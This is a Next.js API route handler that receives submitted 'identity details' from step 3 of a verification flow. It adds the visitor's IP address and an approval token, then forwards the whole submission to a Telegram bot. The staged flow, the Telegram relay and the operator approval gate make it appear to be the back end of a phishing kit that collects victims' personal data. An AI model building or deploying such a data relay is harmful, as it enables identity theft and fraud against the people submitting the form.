import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"
import { getClientIp } from "@/lib/request-ip"
import { createApproval } from "@/lib/approval-gate"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const ip = getClientIp(request)
    const token = createApproval("verify_details")
    await telegramService.sendVerifyDetailsNotification(
      { ...data, ip },
      { token, step: "Step 3 · Identity Details" },
    )
    return NextResponse.json({ success: true, token })
  } catch (error) {
    console.error("Error sending verify-details notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
